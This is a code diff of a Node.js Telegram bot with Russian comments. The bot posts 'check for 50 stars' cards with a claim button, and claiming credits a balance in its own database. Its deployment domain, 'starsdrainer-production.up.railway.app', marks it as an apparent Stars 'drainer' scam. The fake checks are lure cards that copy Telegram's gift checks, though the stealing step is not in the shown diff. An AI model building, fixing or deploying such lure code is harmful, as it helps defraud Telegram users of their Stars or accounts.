@@ -231,54 +231,35 @@ bot.on('message', (msg) => {
     }
 });
 
-// Inline подсказки - ВСЕГДА показываем результат
+// Inline подсказки - ФИКС: только 50 звезд и жирный шрифт
 bot.on('inline_query', (query) => {
-    const amount = query.query.split(' ')[0];
     const domain = 'starsdrainer-production.up.railway.app';
     
-    console.log(`Inline query: "${query.query}", amount: ${amount}`);
+    console.log(`Inline query: "${query.query}"`);
     
-    let results = [];
-    
-    if (amount && !isNaN(amount) && amount > 0) {
-        results = [{
-            type: 'photo',
-            id: '1',
-            photo_url: `https://${domain}/stars.jpg`,
-            thumb_url: `https://${domain}/stars.jpg`,
-            caption: `via @MyStarBank_bot\n\n${amount}\nStars\n\n<b>Чек на 50 звезд</b>`,
-            parse_mode: 'HTML',
-            reply_markup: {
-                inline_keyboard: [[
-                    { text: "<b>Забрать звезды</b>", callback_data: `claim_inline_${amount}`, parse_mode: 'HTML' }
-                ]]
-            }
-        }];
-    } else {
-        results = [{
-            type: 'photo',
-            id: '1', 
-            photo_url: `https://${domain}/stars.jpg`,
-            thumb_url: `https://${domain}/stars.jpg`,
-            caption: `via @MyStarBank_bot\n\n50\nStars\n\n<b>Чек на 50 звезд</b>`,
-            parse_mode: 'HTML',
-            reply_markup: {
-                inline_keyboard: [[
-                    { text: "<b>Забрать звезды</b>", callback_data: `claim_inline_50`, parse_mode: 'HTML' }
-                ]]
-            }
-        }];
-    }
+    const results = [{
+        type: 'photo',
+        id: '1',
+        photo_url: `https://${domain}/stars.jpg`,
+        thumb_url: `https://${domain}/stars.jpg`,
+        caption: `via @MyStarBank_bot\n\n50\nStars\n\n<b>Чек на 50 звезд</b>`,
+        parse_mode: 'HTML',
+        reply_markup: {
+            inline_keyboard: [[
+                { text: "🪙 Забрать звезды", callback_data: `claim_inline_50` }
+            ]]
+        }
+    }];
     
     console.log('Inline results:', results.length);
     bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
 });
 
-// Обработка создания чеков
+// Обработка создания чеков - ФИКС: только 50 звезд
 bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     const chatId = msg.chat.id;
     const userId = msg.from.id;
-    const amount = parseInt(match[1]);
+    const amount = 50; // Всегда 50 звезд
     const activations = parseInt(match[2]) || 1;
     
     console.log(`Создание чека: ${amount} stars пользователем ${userId}`);
@@ -303,7 +284,7 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: "<b>Забрать звезды</b>", callback_data: `claim_${checkId}`, parse_mode: 'HTML' }
+                        { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                     ]]
                 }
             }).catch(e => {
@@ -312,7 +293,7 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
                     parse_mode: 'HTML',
                     reply_markup: {
                         inline_keyboard: [[
-                            { text: "<b>Забрать звезды</b>", callback_data: `claim_${checkId}`, parse_mode: 'HTML' }
+                            { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                         ]]
                     }
                 });
@@ -323,7 +304,7 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
                 parse_mode: 'HTML',
                 reply_markup: {
                     inline_keyboard: [[
-                        { text: "<b>Забрать звезды</b>", callback_data: `claim_${checkId}`, parse_mode: 'HTML' }
+                        { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                     ]]
                 }
             });
@@ -331,51 +312,43 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
     });
 });
 
-// Обработка callback'ов - ФИКС ЗАГРУЗКИ
+// Обработка callback'ов - ПОЛНЫЙ ФИКС ЗАГРУЗКИ
 bot.on('callback_query', (query) => {
     const chatId = query.message.chat.id;
     const userId = query.from.id;
     
     console.log('Callback received:', query.data, 'from user:', userId);
     
+    // Сразу отвечаем чтобы убрать загрузку
+    bot.answerCallbackQuery(query.id).catch(e => console.log('Ошибка answerCallback:', e));
+    
     if (query.data.startsWith('claim_') || query.data.startsWith('claim_inline_')) {
-        // Сразу отвечаем на callback чтобы убрать загрузку
-        bot.answerCallbackQuery(query.id, { text: '⏳ Обработка...' });
         
         if (query.data.startsWith('claim_')) {
             const checkId = query.data.split('_')[1];
             console.log('Обработка чека ID:', checkId);
             
             db.get(`SELECT * FROM checks WHERE id = ? AND activations > 0`, [checkId], (err, row) => {
-                console.log('Результат запроса чека:', err, row);
                 if (err || !row) {
                     console.log('Чек не найден или ошибка:', err);
-                    bot.answerCallbackQuery(query.id, { text: '❌ Чек уже использован или не существует!' });
+                    bot.answerCallbackQuery(query.id, { text: '❌ Чек уже использован!' });
                     return;
                 }
                 
-                console.log('Чек найден:', row);
                 db.run(`UPDATE checks SET activations = activations - 1 WHERE id = ?`, [checkId]);
                 
                 db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                     [userId, userId, row.amount], function(updateErr) {
                     if (updateErr) {
                         console.log('Ошибка обновления баланса:', updateErr);
-                        bot.answerCallbackQuery(query.id, { text: '❌ Ошибка при получении звезд!' });
                         return;
                     }
                     
                     console.log(`✅ Баланс пользователя ${userId} пополнен на ${row.amount}`);
                     
                     // ФИКС: Перекидываем в бота и пишем сообщение
-                    setTimeout(() => {
-                        bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${row.amount} звёзд!`)
-                            .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
-                    }, 500);
-                    
-                    bot.answerCallbackQuery(query.id, { 
-                        text: `✅ Вы получили ${row.amount} звёзд! Переходим в бота...` 
-                    });
+                    bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${row.amount} звёзд!`)
+                        .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
                     
                     const remaining = row.activations - 1;
                     let updatedText = `via @MyStarBank_bot\n\n${row.amount}\nStars\n\n<b>Чек на 50 звезд</b>`;
@@ -393,7 +366,7 @@ bot.on('callback_query', (query) => {
                             parse_mode: 'HTML',
                             reply_markup: remaining > 0 ? {
                                 inline_keyboard: [[
-                                    { text: "<b>Забрать звезды</b>", callback_data: `claim_${checkId}`, parse_mode: 'HTML' }
+                                    { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                                 ]]
                             } : { inline_keyboard: [] }
                         }).catch(e => console.log('Ошибка редактирования подписи:', e));
@@ -404,7 +377,7 @@ bot.on('callback_query', (query) => {
                             parse_mode: 'HTML',
                             reply_markup: remaining > 0 ? {
                                 inline_keyboard: [[
-                                    { text: "<b>Забрать звезды</b>", callback_data: `claim_${checkId}`, parse_mode: 'HTML' }
+                                    { text: "🪙 Забрать звезды", callback_data: `claim_${checkId}` }
                                 ]]
                             } : { inline_keyboard: [] }
                         }).catch(e => console.log('Ошибка редактирования текста:', e));
@@ -414,26 +387,19 @@ bot.on('callback_query', (query) => {
         }
         
         else if (query.data.startsWith('claim_inline_')) {
-            const amount = parseInt(query.data.split('_')[2]);
+            const amount = 50; // Всегда 50 звезд
             console.log('Inline claim:', amount, 'for user:', userId);
             
             db.run(`INSERT OR REPLACE INTO users (user_id, balance) VALUES (?, COALESCE((SELECT balance FROM users WHERE user_id = ?), 0) + ?)`, 
                 [userId, userId, amount], function(err) {
                 if (err) {
                     console.log('Ошибка inline claim:', err);
-                    bot.answerCallbackQuery(query.id, { text: '❌ Ошибка при получении звезд!' });
                     return;
                 }
                 
                 // ФИКС: Перекидываем в бота и пишем сообщение
-                setTimeout(() => {
-                    bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${amount} звёзд!`)
-                        .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
-                }, 500);
-                
-                bot.answerCallbackQuery(query.id, { 
-                    text: `✅ Вы получили ${amount} звёзд! Переходим в бота...` 
-                });
+                bot.sendMessage(userId, `✅ Звезды успешно получены! Вы получили ${amount} звёзд!`)
+                    .catch(e => console.log('Не удалось отправить сообщение пользователю:', e.message));
                 
                 const updatedText = `via @MyStarBank_bot\n\n${amount}\nStars\n\n<b>Чек на 50 звезд</b> (ИСПОЛЬЗОВАН)`;
                 
@@ -490,8 +456,8 @@ bot.on('callback_query', (query) => {
     else if (query.data === 'create_check_info') {
         bot.sendMessage(chatId,
             'Для создания чека используйте:\n\n' +
-            '@MyStarBank_bot 100 50\n\n' +
-            'где 100 - stars, 50 - активаций'
+            '@MyStarBank_bot 50\n\n' +
+            'где 50 - количество активаций'
         );
     }
 });
